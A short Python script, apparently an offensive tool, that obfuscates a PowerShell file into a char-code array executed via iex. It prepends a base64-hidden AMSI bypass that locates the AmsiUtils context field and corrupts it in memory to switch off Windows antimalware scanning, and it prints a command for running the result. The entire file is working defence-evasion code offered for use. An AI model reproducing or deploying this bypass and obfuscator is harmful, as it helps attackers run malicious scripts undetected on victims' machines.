import os,sys
import base64
import argparse

def chararray(cmdstring):
    res = [str(ord(c)) for c in cmdstring]
    #print (res)
    return res
    pass

def writeobfusc(src,dest):
    b = open(src,'r')
    body = b.read()
    b.close()
    chars = chararray(body)
    chars = ", ".join(chars)
    charscradle = "iex([System.Text.Encoding]::ASCII.GetString([char[]]@(%s)))" % chars

    amsi = "JGE9W1JlZl0uQXNzZW1ibHkuR2V0VHlwZXMoKTtGb3JFYWNoKCRiIGluICRhKSB7aWYgKCRiLk5hbWUgLWxpa2UgJyppVXRpbHMnKSB7JGM9JGJ9fTskZD0kYy5HZXRGaWVsZHMoJ05vblB1YmxpYyxTdGF0aWMnKTtGb3JFYWNoKCRlIGluICRkKSB7aWYgKCRlLk5hbWUgLWxpa2UgJypDb250ZXh0JykgeyRmPSRlfX07JGc9JGYuR2V0VmFsdWUoJG51bGwpO1tJbnRQdHJdJHB0cj0kZztbSW50MzJbXV0kYnVmPUAoMCk7W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkYnVmLCAwLCAkcHRyLCAxKQ=="
    amsi = base64.b64decode(amsi).decode()
    amsi = chararray(amsi)
    amsi = ", ".join(amsi)
    amsicradle = "iex([System.Text.Encoding]::ASCII.GetString([char[]]@(%s)))" % amsi

    with open(dest,'w') as f:
        f.write(amsicradle + "\n\n")
        f.write(charscradle)
    f.close()

    print('[+] obfuscated output written: %s' % (dest))
    pass

def makeobfusc(src,dest):
    writeobfusc(src,dest)
    print("[+] tips to run obfuscated file locally:\n")
    print("gc .\\%s | powershell -noprofile -" % dest)
    pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--src','-s',required=True,dest='src',help='source filename')
    args = parser.parse_args()

    src = args.src
    dest = "o%s" % src

    if "/" in src:
        chunks = src.split("/")
        last = chunks[-1]
        dest = "o%s" % last

    print("[*] src: %s" % src)
    print("[*] dest (current folder): %s" % dest)
    
    makeobfusc(src,dest)
